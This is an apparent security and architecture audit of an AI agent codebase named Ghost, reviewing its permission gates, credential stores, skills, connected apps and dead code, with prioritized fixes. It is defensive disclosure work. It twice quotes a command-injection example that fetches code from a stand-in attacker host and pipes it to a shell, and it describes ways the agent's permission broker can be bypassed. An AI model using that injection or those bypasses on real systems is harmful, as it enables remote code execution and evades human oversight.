# Ghost — Tools, Skills & Connected Apps: Forensic Architecture + Product Audit

**Repository:** `/home/ianclemence/ghost`
**Commit inspected:** `cb468797760b2b749c92a31c6b9a8c46d84a235c`
**Status:** Audit only. No behavior changed. No redesign implemented.
**Governing principles:** *The model is allowed to be wrong; the system is not allowed to blindly believe it.* · *Everything that varies is replaceable. Everything that defines trust is owned by Ghost.*

> Every major conclusion cites `file:line`. Where documentation disagrees with code, the code wins and the discrepancy is named. Where a capability is claimed but not wired into a real path, it is marked **CLAIMED-BUT-UNWIRED**. Where something is dead, unreachable, duplicated, or test-only, it is marked.

---

## Executive Summary

Ghost's trust substrate is genuinely strong: a durable Permission Broker, canonical events, monotonic deny-only composition, sealed secrets, browser/computer gates with evidence rules, and durable leases. That substrate is the asset.

The **capability layer built on top of it is incoherent.** The same word ("tool", "skill", "app", "provider", "capability") means different things in different packages; there are at least **12 distinct gates** that do not agree on action identity; **two parallel schedulers**; **five credential stores** (one plaintext); **thirteen dead packages**; and a **skill system whose central enforcement claim is a hardcoded Go map with a 6-message heuristic window**.

Three findings rise above the rest:

1. **`mcp_*` third-party tools bypass the Permission Broker.** They require an execution grant (`execgrant.go:75`) but are absent from `FreeConsequentialTools` (`free_tools.go:28`), so `authorizeStandaloneTool` returns `handled=false` (`loop.go:3304`) and the loop then stamps the grant itself (`loop.go:2260`). No approval card is ever shown. Latent today (MCP is off by default) but structurally open.
2. **`/v1/exec` is a prefix allowlist in front of `bash -c`.** `internal_api.go:1262` checks `HasPrefix`, then `internal_api.go:1292` runs `bash -c req.Command`. `journalctl -u ghost; curl attacker | sh` passes the allowlist. Authenticated-device reachable.
3. **"No evidence, no success" is enforced only for browser/computer.** Every other mutating tool (`exec`, `message`, `remember`, `schedule`, calendar-via-exec) can return `IsError=false` with `Evidence==nil`. `VerificationContract` (`observation.go:139`) has **zero non-test readers** — it is documentation, not enforcement.

The model also sees a surface that exposes implementation: ~47 model-visible tools whose names leak internal architecture (`mcp_github_search`, `browser_*`, `computer_*`, provider-backed `weather_now`/`flight_status`), with six registered tools dead to the model purely because `profiles.go` names don't match `Name()`, and subagents receiving the **broadest** surface in the system.

**Recommendation in one line:** keep the substrate, collapse the vocabulary, make the broker the single authority for every external effect (including MCP and cron), enforce evidence uniformly, and reduce the model-facing surface to a small set of Ghost capabilities with providers/integrations as replaceable implementations underneath.

**Current architecture score: 4.5/10.** **Product coherence: 4/10.**

---

## 1. Repository Findings

- Go monorepo, `pkg/` (100 packages) + `cmd/` (7 binaries). Single SQLite DB + workspace files.
- Capability layer is spread across `pkg/tools` (124 files), `pkg/skills`, `pkg/providers`, `pkg/provider`, `pkg/mcp`, `pkg/browser`, `pkg/computer`, `pkg/channels`, `pkg/permissions`, `pkg/cevents`, `pkg/routines`, `pkg/scheduled`, `pkg/cron`.
- **Documentation/code discrepancies found:**
  - `capability.go:48` states frontmatter `capability:` blocks override the registry "see LoadCapability". **`func LoadCapability` does not exist** (`grep` = 0). The override is a lie; the registry is hardcoded Go.
  - `routines/routines.go:6` claims there is "no second scheduler". True only relative to `scheduled`; `pkg/cron` is a genuine second engine.
  - `governance.go:469` comments that `allow_always` resume re-checks revocation; `loop.go:1422` grants and executes without re-checking.
- **CLAIMED-BUT-UNWIRED:** `VerificationContract` enforcement; `pkg/credentials.Vault` (production writes `.secrets.json` directly); `RefreshCalendarToken`; `browser.Driver`; `computer.placements.Registry`; `skills.Hub`; `pkg/credential`; `capability:` frontmatter.

## 2. Current Architecture

```
channels/relay/web ─► agent loop ─► model ─► tool_call
                                        │
        profile allowlist (tools/profiles.go)
        committed-skill AllowedTools (skills/capability.go)  ← 6-message window
        Permission Broker (permissions/permissions.go)        ← central, but not universal
        exec-grant default-deny (tools/execgrant.go)
        browser gate / computer gate (agent/*_gate.go)
                                        │
                        registry.ExecuteWithContext (tools/registry.go)
                        schema validate → reliability/retry → Verify (opt-in) → Observation
                                        │
                        governance.ToolRan → cevents (canonical events)
```

The substrate is sound. The diagram hides three problems: gates key actions differently (`tool:action` vs bare `tool`), two broker instances share one DB with divergent emitters, and several paths (MCP, cron, subagents, slash commands) reach execution without passing the full chain.

## 3. Complete Tool Inventory

**Counts:** 56 registered names (incl. `mcp_*` wildcard + config-conditional) · ~47 model-visible · 9 registered-but-never-visible · 2 hidden-with-TTL · 7 dead unregistered + 1 duplicate.

### Table A — Capability Inventory (representative; full set in `pkg/tools`)

| Capability | Implementation | Model-visible | User-visible | Permission | Credential | Evidence | Canonical event | Integration | Status | Recommendation |
|---|---|---|---|---|---|---|---|---|---|---|
| read_file / list_dir / write_file / edit_file / append_file | filesystem.go, edit.go | yes (core) | no | profile+broker for writes | no | write_file only | ToolCompleted | local | live | keep; add Verify to edit |
| exec | shell.go:34 | hidden→auto-visible | no | broker (high_impact) | env-sanitized | exit-code only | ToolCompleted | local | live | **fix TTL; add evidence** |
| sandbox | sandbox.go:25 | hidden→auto-visible | no | broker (consequential) | isolated | exit-code | ToolCompleted | local | live | fix TTL |
| browser_navigate/snapshot/click/type/press | browser.go:82 | yes (intent) | no | browser gate + broker | session ledger | **yes (page evidence)** | ToolCompleted + Evidence | agent-browser CLI | live | keep (gold standard) |
| computer_inspect_ui/screenshot/click/type/press_key | computer_tool.go:69 | yes (intent) | no | computer gate + lease | local executor | **yes** | ToolCompleted + Evidence | local | live | keep |
| weather_now / aqi_now / currency_convert / crypto_price / places_nearby / flight_status | providers.go (wrappers) | yes (core) | no | broker (read) | `.secrets.json` | none | none | provider services | live | keep; rename to capability |
| hass | providers.go:430 | **never** | no | broker (consequential) | `.secrets.json` | none | none | Home Assistant | **unreachable** | add to profiles |
| message | message.go:38 | yes (core) | no | broker (consequential) | channel token | none | ToolCompleted | channels | live | add evidence/verify |
| remember | remember.go:33 | yes (core) | no | **none (standalone)** | no | none | ToolCompleted | memory | live | **broker it** |
| schedule / cron | schedule.go:41 / cron.go:67 | yes (core) | yes (Automations) | broker (low) | no | none | ToolCompleted | scheduler | live | add evidence |
| skill_manage | skill_manage.go:29 | yes (core) | yes (Skills) | broker (high) | no | none | ToolCompleted | skills | live | keep |
| web_search / web_fetch | web.go | yes (core) | no | broker (read) | Firecrawl/Brave key | none | none | providers | live | **mark untrusted** |
| mcp_<server>_<tool> | mcp_tool.go:31 | never (off by default) | no | **grant only (broker bypass)** | config env (unsealed) | none | none | MCP | latent | **broker it** |
| image_generate | imagegen.go:35 | yes (intent) | no | broker (consequential) | FAL key | none | none | — | live | delete dead twin |
| switch_lane, voice_wake, compact_context, doc_parser, batch_delegate, publish_artifact, i2c | various | **never** | no | varies | — | — | — | — | **name mismatch** | fix profiles.go |

### Table B — Tool Inventory (risk/governance)

| Tool | Risk | Scope | Brokered | Model-visible | Provider-specific | Duplicate | Recommendation |
|---|---|---|---|---|---|---|---|
| exec | high_impact | shell | yes (committed) / standalone | after TTL | no | no | keep, fix exposure |
| sandbox | consequential | code exec | yes | after TTL | no | no | keep |
| message | consequential | outbound | yes | yes | no | `message_write` phantom | keep |
| remember | low | memory | **no** | yes | no | no | broker |
| hass | consequential | device | yes (but unreachable) | no | yes | no | expose via profile |
| mcp_* | ? | third-party | **no** | no | yes | no | broker |
| image_generate | consequential | media | yes | yes | no | dead FAL twin | dedupe |
| weather_now etc. | read | info | yes | yes | yes | no | keep, rename |

## 4. Tool Execution Flow

The real chain (verified):

```
model response.ToolCalls                          loop.go:2093
└─ profile allow?                                  loop.go:2169
└─ committed-skill AllowedTools? (6-msg window)    loop.go:2186
└─ broker (committed): AuthorizeTool               loop.go:2212
└─ broker (standalone): authorizeStandaloneTool    loop.go:2226 → free_tools.go:28
└─ GrantExec(toolCtx, tc.Name)  [if governance]    loop.go:2259
└─ browser/computer gate OR registry.Execute       loop.go:2272
   registry: isAllowed → grant check → schema → reliability → Verify(opt-in) → Observation
└─ governance.ToolRan → cevents                    governance.go:153
```

**Where the chain breaks:**

| Break | Evidence | Consequence |
|---|---|---|
| MCP not in `FreeConsequentialTools` | free_tools.go:28; loop.go:3304 | third-party tool runs on self-stamped grant, no approval |
| `remember` unbrokered standalone | loop.go:2226 | memory written with no broker decision |
| cron self-mints exec grant | cron.go:390 | scheduled shell never seen by broker |
| `allow_always` resume skips revocation | governance.go:478; loop.go:1422 | revoked grant can still resume |
| hidden tools auto-promote after TTL | registry.go:157; loop.go:202 | `exec` becomes model-visible after 6h uptime |
| committed-skill scope = last 6 messages | loop.go:3331 | restrictions vanish mid-turn on long chains |
| subagents get unfiltered surface | toolloop.go:134; subagent.go:182 | broadest route to actuators |
| slash commands call `tool.Execute` directly | builtin.go:185,254,375; loop.go:57 | no grant/schema/broker |

## 5. Skill System Audit

**Mechanically:** a skill is a directory with a markdown `SKILL.md`. Nothing executes on load. Loader scans `workspace/skills/<name>/SKILL.md`, flat `workflows/*.md`, global, builtin (`loader.go:61-192`). Discovery is prompt-mediated: a 12k-char `<skills>` index (`loader.go:245-308`) instructs the model to `read_file` a SKILL.md; there is no `use_skill` tool. Invocation *is* a `read_file` of a `SKILL.md` path.

### Table C — Skill Inventory

| Skill mechanism | Purpose | Can execute? | Can access tools? | Can access secrets? | Can modify behavior? | Can persist? | Security boundary | Recommendation |
|---|---|---|---|---|---|---|---|---|
| SKILL.md instructions | guidance | no | via model | no | prompt only | no | none (text) | keep |
| AllowedTools (capability.go) | closed tool path | indirectly | yes (incl. exec) | no | yes | no | hardcoded map, 6-msg window | rebuild |
| `schedule:` frontmatter | auto cron | yes | via cron exec | no | yes | **yes, unapproved** | none | gate at install |
| skill_manage | create/patch/delete skills | yes | yes | no | yes | yes (files) | broker high_impact | keep |
| install (GitHub/ClawHub) | fetch SKILL.md | no | no | no | no | yes | bounds only, **no trust** | consolidate |
| `capability:` frontmatter | override registry | — | — | — | — | — | **does not exist** | implement or delete comment |

**A–H answers:** A) yes, instructions only, mechanically. B) **no** — capability is code-defined; the override is unwired. C) **yes** — many registry entries list `exec`; unknown skills are unrestricted (`capability.go:96,118`). D) **yes** — `schedule:` auto-registers cron at startup with no approval (`main.go:1596`). E) **not directly** — env allowlist, bubblewrap, workspace restriction, cron secret gate. F) **partially** — `skill_manage` broker-gated; `exec` can run `ghost skills install`. G) **yes** — hass, calendar via exec, message, spotify/adb. H) **partly** — can add cron and manage workspace skills; cannot alter the code registry.

**Blunt:** the skill subsystem is an agent-framework artifact bolted onto a markdown loader. The enforcement claim (`AllowedTools`) is a hardcoded map that covers ~21 remembered skills; user-installed skills run **unrestricted**. `committedSkill` is a 6-message substring heuristic. `schedule:` makes install a persistent-behavior install. Three GitHub installers and two ClawHub clients already drift. No signatures/hashes/review: a skill is trusted as text and then drives `exec`.

## 6. Connected Apps Audit

### Table D — Connected Apps

| App | Authentication | Scopes | Capabilities | Credential storage | Brokered | Evidence | Disconnect behavior | Mobile | Web | Routines | Recommendation |
|---|---|---|---|---|---|---|---|---|---|---|---|
| Google Calendar (web OAuth) | OAuth2 web-server | calendar | via gcalcli exec | `.credentials/calendar-token.json` **plaintext** | via exec | none | **inconsistent (leaves token)** | no | yes | yes | seal; unify |
| Google Calendar (gcalcli) | device flow | calendar | via exec | `.calendar/` | via exec | none | yes | no | yes | yes | retire once web verified |
| Home Assistant | bearer + URL | device | `hass` (R/W) | `.secrets.json` | yes | none | deletes key | yes | yes | yes | expose to model |
| Weather/AQI/Currency/Crypto/Nearby | keyless | — | provider tools | n/a | yes | none | n/a | yes | partial | yes | keep |
| Flight | API key | — | `flight_status` | `.secrets.json` | yes | none | deletes key | yes | yes | yes | keep |
| GitHub | CLI/auth | repo | via exec | `gh` config | via exec | none | n/a | no | yes | yes | define capability |
| Telegram/Discord/Slack/LINE/Email/SMS/WeChat | bot/token/password | channel | messaging | `.secrets.json` | channel layer | none | disables | no | no | yes | keep |
| MCP servers | env/headers/OAuth | server-defined | `mcp_*` | config (unsealed), OAuth in-memory | **no** | none | none | no | no | no | broker; persist |
| Composio | — | — | — | — | — | — | — | — | — | — | **absent** |

## 7. Composio / MCP / Connector Audit

- **Composio: absent.** `grep -ri composio pkg/ cmd/` matches only an unrelated word in `personalcontext/semantic.go:371`.
- **MCP: present, off by default** (`config.go:476`). Out-of-process (stdio/SSE), `mcp_<server>_<tool>` (`mcp_tool.go:31`), manager with schema cache/health (`mcp/manager.go`). **No connector registry, no marketplace.**
- **Boundary:** MCP tools bypass `skills.capabilityRegistry` risk declarations and rely only on the exec-grant gate — a second, thinner permission system for third-party code. MCP OAuth tokens are in-memory and unsealed.
- **Verdict:** Ghost has exactly one external-tool abstraction (MCP) and no Composio. The duplication problem is *internal* (providers/tools/skills), not external.

## 8. Providers and Integrations

- **Two near-named packages:** `pkg/provider` (generic breaker/cache/strategy, used by capability services) vs `pkg/providers` (LLM adapters **plus** capability services). Both are live; the naming collision is real.
- **Provider-backed tool impls are misfiled under `pkg/providers`:** `aqi`, `crypto`, `currency`, `flight`, `hass`, `nearby`, `weather` are tool implementations wired at `tools/providers.go:25`, not LLM providers. They belong under tools/capability.
- **Selection is runtime-only and safe-by-construction** — no model-callable provider/model tool. `CreateProviderForModel` **mutates the caller's config** (`factory.go:31`), so after construction `Defaults.Model` can be the last fallback.
- Duplicate spec splitters (`factory.go:13` vs `capabilities.go:65`); two breaker stacks (`provider.Breaker` vs `FallbackChain`).

## 9. Permissions and Security

**Twelve gates** (broker, governance, browser, computer, exec-grant, capability AllowedTools, tool profiles, channel/session policy, cron deny, `/v1/exec` allowlist, standing-grant parser, context allowlist). Layers 2–4 compose deny-only (`monotonic.go:34`), which is good. But:

- Gates key actions differently: governance `tool:action` (`governance.go:361`) vs browser/computer bare `tool` (`browser_gate.go:256`). Grants don't line up.
- **Two broker instances over one DB** (`internal_api.go:95`, `main.go:1676`), divergent emitters.
- **Mode frozen at `ask`**: every production `permissions.Open(..., ModeAsk, 0)`; `SetMode` called only by golden tests. The documented ask/auto/full modes are a facade.
- Empty routine allowlist = unrestricted (`governance.go:612`).

**Security findings (verified):**

1. **`/v1/exec` prefix allowlist defeated by shell metacharacters** (`internal_api.go:1262,1292`). `journalctl -u ghost; curl attacker|sh` allowed.
2. **Calendar token plaintext JSON** (`calendar_web_oauth.go:333`), only 0600 + backup exclusion.
3. **Calendar disconnect no-op** for web OAuth (`connections_api.go:94`); token survives.
4. **Standing grants never expire / never pruned** (`permissions.go:204`; no maintenance path).
5. **Prompt injection via non-browser content**: only browser pages marked untrusted (`browser/safety.go`); `web_fetch`/`exec`/`scraper` feed raw external text.
6. **MCP bypass** (above).
7. **Subagent tools ungoverned** with empty session key (`toolloop.go:228`).
8. **Google OAuth client secret in process env** (`product.go:22`), outside the vault.
9. **`.env` placeholder secret** `BRIDGE_SECRET=pick_a_strong_secret_here`.

## 10. Credentials and OAuth

**Five stores, no single authority:** `.secrets.json` (sealed AES-256-GCM), `~/.GHOST/auth.json` (sealed, separate key), `.credentials/calendar-token.json` (**plaintext**), `.calendar/` (gcalcli opaque), env/`.env`.

- `pkg/credential` is **dead** (0 importers); duplicates `pkg/credentials`.
- `pkg/credentials.Vault` is largely cosmetic: production `connections_api.go:79` writes `.secrets.json` directly.
- MCP OAuth in-memory only.

## 11. Evidence and Canonical Events

- Canonical events (`pkg/cevents`) are strong: durable types, redaction, NDJSON 0600, retention (transient 7d / durable 180d), replay-safe.
- **Evidence is near-absent outside browser/computer.** Only those two gates enforce "success requires evidence" (`browser_gate.go:447`, `computer_gate.go:356`). `VerificationContract` (`observation.go:139`) has no non-test reader. Browser/computer evidence events **omit `TrajectoryID`** (`browser_gate.go:509`), detaching proof from the turn.
- `pkg/trajectory` is a second, unrelated "trajectory" saved world-readable.

## 12. Duplication Map

### Table E — Architecture Duplication

| Concern | Implementation A | Implementation B | Overlap | Risk | Recommendation |
|---|---|---|---|---|---|
| Credential store | `pkg/credentials` (Vault) | `pkg/credential` (dead AES) | same intent | dead code confusion | delete `pkg/credential` |
| Schedulers | `pkg/scheduled` (SQLite) | `pkg/cron` (JSON) | at/every/cron | `/remind` vs routines split | merge into one |
| Providers | `pkg/provider` (breaker) | `pkg/providers` (LLM) | name + resilience | confusion | rename `pkg/provider`→`pkg/resilience` |
| Capability services | under `pkg/providers` | should be `pkg/tools` | misfiled | boundary blur | move |
| GitHub install | installer.go | internal_api.go, admin.go | 3 copies | drift | consolidate |
| ClawHub client | clawhub_registry.go | admin.go | 2 copies | drift | consolidate |
| Zip extraction | utils.ExtractZipFile | admin.go extractZipToDir | 2 copies | drift | consolidate |
| Spec splitters | factory.go:13 | capabilities.go:65 | identical | drift | one helper |
| Resilience | provider.Breaker | FallbackChain | two breakers | disagreement | unify |
| Skill status | capability.go | provider.go / readiness.go | 3 models | inconsistency | one |
| Event bus | `pkg/events` (dead) | `pkg/cevents` | superseded | dead code | delete `pkg/events` |
| Risk table | capabilityRegistry | permissions.go:36 hardcoded | 2 lists | silent fail-closed | single source |
| "Trajectory" | cevents.TrajectoryID | pkg/trajectory (dead) | name collision | forensics | delete/rename |

## 13. Dead / Unused / Low-value Functionality

**Dead packages (0 non-test importers):** `pkg/credential`, `pkg/compose`, `pkg/moa`, `pkg/reasoning`, `pkg/review`, `pkg/skillimprove`, `pkg/learninggraph`, `pkg/memory`, `pkg/events`, `pkg/interaction`, `pkg/presentation`, `pkg/trajectory`, `pkg/setup`.

**Dead tools (constructors exist, never registered):** `agent_message`, `approval`, `profile`, `kanban`, `subagent_list`, `subagent_read`, `subagent_stop`; duplicate `image_generate` (FAL); phantom `message_write` in `free_tools.go:30`.

**Dead abstractions:** `browser.Driver` (only FakeDriver), `computer.placements.Registry`, `skills.Hub`, `RefreshCalendarToken`, `capability:` frontmatter, `VerificationContract` enforcement.

## 14. Model-visible Tool Surface

- ~47 model-visible names; names expose internals (`mcp_github_search`, `browser_snapshot`, `computer_press_key`, `weather_now`).
- Six tools dead to the model purely from `profiles.go` name mismatches (`voice_wake` vs `"voicewake"`, `switch_lane` vs `"lanes"`, `batch_delegate` vs `"delegate_batch"`, `compact_context` vs `"compaction"`, `doc_parser` vs `"docparser"`, `mcp_*` vs `"mcp"`); `i2c`, `hass`, `publish_artifact` absent from all tables.
- Subagents receive the **unfiltered** surface (`toolloop.go:134`).
- The desired experience — *Ghost decides, discovers, obtains authority, executes, verifies, reports* — is **not** how it works today: the model is handed a large list and asked to choose.

## 15. Product-facing Capability Map

| User intent | Today's mechanism | Gap |
|---|---|---|
| KNOW (remember/recall/explain/search/summarize) | `remember`, `memory_recall`, `context_get`, `session_search`, RAG | strong |
| ACT (create/change/send/book/cancel/move) | `message`, `exec`, calendar via exec | no `book`/`move` capability; shell fallback |
| SEE (browser/computer/images/files/screens) | browser_*, computer_*, vision | strong, evidence-backed |
| AUTOMATE (remind/schedule/repeat/watch/react) | cron + scheduled + routines (2 schedulers) | fragmented |
| CONNECT (calendar/email/messaging/home/github/cloud) | exec + provider tools + channels | no unified connection model |
| CONTROL (devices/smart home/computer/browser) | `hass` (unreachable), browser/computer | hass not exposed |
| HAND BACK (files/docs/links/reports/artifacts) | `publish_artifact` (unreachable), `message` | artifact path not surfaced |

## 16. Tools vs Capabilities vs Providers vs Skills vs Connected Apps

**Current:** all five are conflated. A "tool" is simultaneously a primitive, a provider adapter, an app action, and a user action. A "skill" is instructions *and* an enforcement boundary. A "provider" is an LLM *and* a weather service. A "connected app" is a credential + an exec command.

**Recommended Ghost model (derived from the repo's own substrate):**

- **Capability** — *what Ghost can do*, owned by Ghost: `remember`, `recall`, `schedule`, `send_message`, `control_device`, `get_weather`, `browse`, `take_over`, `publish_artifact`. Has risk, scope, evidence contract, canonical event.
- **Provider/Integration** — *how a capability is implemented*: Open-Meteo, Gmail, Google Calendar, Home Assistant, GitHub. Replaceable, never model-visible.
- **Skill** — *reusable knowledge/procedure* that composes capabilities: instructions + declared capability needs + examples. Not an authority boundary.
- **Connected App** — *an authenticated external system* Ghost can operate through: identity + credential + scopes + the capabilities it enables.
- **Credential** — *a secret* owned by the vault, never by a skill/provider.
- **Tool** — *the internal model-facing invocation mechanism* (an implementation detail of a capability), not a product concept.

## 17. Current vs Recommended Architecture

| Aspect | Current | Recommended |
|---|---|---|
| Model-facing names | 47 raw tools | ~15 capabilities |
| Authority | 12 disagreeing gates | one broker, every external effect |
| Skills | enforcement boundary + text | knowledge/composition only |
| Providers | `pkg/providers` LLM + services | LLM adapters separate from capability impls |
| Connected apps | credential + exec command | identity + scopes + capability mapping |
| Evidence | browser/computer only | every mutating capability |
| Scheduling | 2 engines | 1 engine |
| Credentials | 5 stores | 1 vault |

## 18. Recommended Ghost Capability Minimum

**Core (own natively):** remember · recall · forget · summarize · search · schedule/remind · browse · inspect screen (computer) · take over · send message · publish artifact · get weather · nearby · currency/crypto · control device (Home Assistant) · calendar (read/write).

**Extension (via integration):** email, GitHub, Notion, messaging breadth, cloud storage.

**Infrastructure (never model-visible):** exec, sandbox, filesystem primitives, update, i2c/spi, MCP plumbing.

**Experimental:** multi-agent delegation, MoA, skill marketplace.

**Remove:** the 13 dead packages, 7 dead tools, `pkg/credential`, `pkg/events`, one scheduler.

## 19. Connected App Strategy

Classify: **CORE NOW** (calendar, Home Assistant, weather/maps, messaging) · **CORE SOON** (email, GitHub) · **EXTENSION** (Notion, cloud storage, music) · **OPTIONAL** (everything else) · **NOT WORTH** (long-tail marketplaces). One connection registry, one credential vault, one scope model, disconnect that actually revokes.

## 20. Skill Strategy

**Current skill model:** markdown instructions + a hardcoded Go `AllowedTools` map + a 6-message commit heuristic + install-time cron. **Recommended Ghost skill model:** a *reusable procedure that composes capabilities*, declaring the capabilities it needs (not raw tool names), with no authority of its own; the broker authorizes capabilities, not skills. Install is data, never persistent behavior; `schedule:` requires explicit user approval.

## 21. Security Risks

Ranked in §24. Top: `/v1/exec` metacharacter bypass (P0); MCP broker bypass (P0, latent); calendar token plaintext + disconnect no-op (P1); evidence gap for mutating tools (P1); prompt injection via non-browser content (P1); standing grants never expire (P1); hidden tool auto-promotion (P2); committed-skill window erosion (P2); subagent ungoverned surface (P2).

## 22. UX / Terminology Problems

Users see "Skills", "Connected Apps", "Integrations", "Automations", "Routines", "AI & providers" — one concept split across six labels; "Tools" has no UI at all. Raw capability IDs, risk levels, status strings, cron expressions, and GitHub SHAs leak into the console (`permissions.js:66`, `routines.js:47`, `automations.js:271`, `skills.js:238`). Ghost reads as "configure your agent framework," not "your Ghost can connect to things and get things done."

## 23. Remove / Merge / Keep / Rename / Move / Rebuild / Defer

**REMOVE:** `pkg/credential`, `pkg/compose`, `pkg/moa`, `pkg/reasoning`, `pkg/review`, `pkg/skillimprove`, `pkg/learninggraph`, `pkg/memory`, `pkg/events`, `pkg/interaction`, `pkg/presentation`, `pkg/trajectory`, `pkg/setup`; dead tools (`agent_message`, `approval`, `profile`, `kanban`, `subagent_list/read/stop`, FAL `image_generate`); phantom `message_write`; `skills.Hub`; `browser.Driver`; `computer.placements.Registry`.
**MERGE:** two schedulers → one; two credential packages → one; three GitHub installers → one; two ClawHub clients → one; two zip extractors → one; two spec splitters → one; two breakers → one; two risk lists → one.
**KEEP:** broker, cevents, vault (`.secrets.json`), browser/computer gates, evidence pattern, routines product layer, MCP manager.
**RENAME:** `pkg/provider`→`pkg/resilience`; `pkg/providers` LLM-only; capability services → `pkg/capabilities`.
**MOVE:** `pkg/providers/{aqi,crypto,currency,flight,hass,nearby,weather}` → capability impls.
**REBUILD:** skill capability model; model-facing surface; evidence enforcement; connection registry.
**DEFER:** MoA, multi-agent, marketplace.

## 24. Prioritized Recommendations

**P0 (must fix):** (1) `/v1/exec` — replace prefix allowlist with argv allowlist, no shell. (2) Broker-gate `mcp_*` (add to `FreeConsequentialTools`). (3) Make the broker the single authority: remove self-stamped grants from cron/MCP paths. (4) Enforce evidence on every mutating capability.
**P1 (important):** (5) Seal the calendar token; fix disconnect to revoke. (6) Expire/prune standing grants; re-check revocation on `allow_always`. (7) Mark all external content untrusted (`web_fetch`, `exec`, `scraper`). (8) Delete the 13 dead packages + dead tools. (9) Merge schedulers. (10) Single credential vault; retire `pkg/credential` and the cosmetic Vault.
**P2 (worthwhile):** (11) Collapse the model surface to capabilities; fix `profiles.go` name mismatches. (12) Rebuild the skill model around capabilities. (13) Unify gate action keys; one broker instance. (14) Connection registry + scope model. (15) UI terminology pass.
**P3 (later):** (16) PKCE for calendar OAuth. (17) Untrusted-content framing for tool results. (18) Rename/move packages.

## 25. Architecture Scorecard

| Dimension | Score | Justification |
|---|---|---|
| Conceptual clarity | 3 | tool/skill/provider/app/capability conflated |
| Tool architecture | 4 | strong registry, but name mismatches, dead tools, no evidence |
| Skill architecture | 3 | hardcoded map, 6-msg window, unwired override |
| Connected-app architecture | 3 | five credential stores, no registry, disconnect no-op |
| Permission integration | 5 | excellent broker, but 12 gates, 2 instances, MCP gap |
| Credential security | 5 | sealed vault exists, but plaintext calendar + dead duplicate |
| Evidence integrity | 4 | browser/computer gold; everything else absent |
| Model-facing simplicity | 3 | 47 tools, internals leak, subagents unfiltered |
| Provider abstraction | 5 | works, but misfiled services + config mutation |
| Extensibility | 6 | MCP + skills + routines exist |
| User experience | 4 | six labels, raw internals |
| Product coherence | 4 | substrate great, surface incoherent |
| Maintainability | 4 | 13 dead packages, duplication |
| Testability | 6 | broad test suite, golden suite |
| Offline/local-first | 7 | genuinely local, sealed, keyless providers |

**Current architecture score: 4.5/10.**
**Overall product coherence: 4/10.**

## 26. Recommended Next Steps

1. P0 security fixes (4 items) in one small, reviewed change.
2. Delete dead packages/tools (mechanical, low-risk).
3. Define the capability contract (interface: risk, scope, evidence, event, providers) — design only.
4. Migrate the top 8 capabilities to the contract.
5. Collapse the model surface + fix `profiles.go`.
6. Merge schedulers; unify credentials; connection registry.
7. UI terminology pass.

---

## Final Executive Answers

1. **Tools Ghost actually needs:** a small capability set — remember, recall, forget, summarize, search, schedule/remind, send_message, browse, computer inspect/takeover, publish_artifact, get_weather, nearby, currency/crypto, control_device, calendar.
2. **Tools it has that it does not need:** the 7 dead tools + FAL `image_generate` + phantom `message_write`; raw `i2c`/`spi`/`update` as model-facing; `mcp_*` raw names.
3. **What a Ghost "tool" should mean:** the internal model-facing invocation mechanism of a capability — an implementation detail, never a product concept.
4. **What a Ghost "skill" should mean:** reusable knowledge/procedure that composes capabilities, declaring needed capabilities (not raw tools), with no authority of its own.
5. **What a "connected app" is:** an authenticated external system (identity + credential + scopes) through which Ghost exercises capabilities.
6. **Tool vs Capability vs Provider vs Skill vs App vs Credential vs Integration:** tool = invocation mechanism; capability = what Ghost can do (Ghost-owned); provider = an implementation of a capability; integration = the plumbing binding a provider/app; connected app = authenticated external system; skill = knowledge composing capabilities; credential = a secret in the vault.
7. **Permission lives:** in the one Permission Broker, for every external effect, with no self-stamped grants.
8. **Credentials live:** in the one sealed vault (`.secrets.json` + master key), for every secret, including calendar and MCP OAuth.
9. **Evidence lives:** attached to every mutating tool result and published as a canonical event carrying `TrajectoryID`.
10. **Canonical semantics owned by:** Ghost (`pkg/cevents`), always.
11. **Raw third-party tools to the model:** no — wrap them as Ghost capabilities.
12. **Providers to the model:** no — runtime-only.
13. **Should users think about tools:** no.
14. **Should users think about skills:** no — they should think about what Ghost can do.
15. **Should users think about connected apps:** yes — "connect your calendar," not "configure a provider."
16. **Ideal architecture:**

```
USER → GHOST → INTENT → CAPABILITY → PERMISSION BROKER → INTEGRATION/PROVIDER → EXECUTION → EVIDENCE → CANONICAL EVENT
                              ▲
                          SKILLS (knowledge composing capabilities, no authority)
                          CONNECTED APPS (authenticated systems behind integrations)
                          CREDENTIALS (vault)
```

17. **Remove first (top 5):** dead packages; dead tools + phantom entries; `pkg/credential`; `pkg/events`; one scheduler.
18. **Build next (top 5):** capability contract; broker coverage for MCP/cron; uniform evidence; single credential vault; connection registry.
19. **Explicitly NOT build:** another permission system; another credential store; a second scheduler; a plugin kernel; a generic integration marketplace.
20. **Single biggest architectural weakness:** the capability/authority boundary is not one thing — twelve gates and multiple self-stamped grants mean trust is not owned by one layer.
21. **Single biggest product opportunity:** collapse the surface so the user experiences *"my Ghost gets things done"* — capability-first, provider-invisible, evidence-backed — turning the strong substrate into a coherent product.

### Product test assessment

A normal owner pairing Ghost and saying *"remember I prefer quiet places / what's on tomorrow / move that appointment / find me a place nearby / send this to Sarah / open the website / take over / set this up every Sunday"* would today hit: memory (works), calendar (two token stores, gcalcli exec), nearby (works), send (works), browse/takeover (works, evidence-backed), recurring (two schedulers, skills auto-cron). Roughly **half the journey is excellent and half is incoherent**, and the owner would occasionally be exposed to raw capability IDs and cron strings. The substrate can deliver the vision; the capability layer must be made coherent first.

---

*End of audit. No redesign implemented. Ready for the CTO/product architecture pass.*
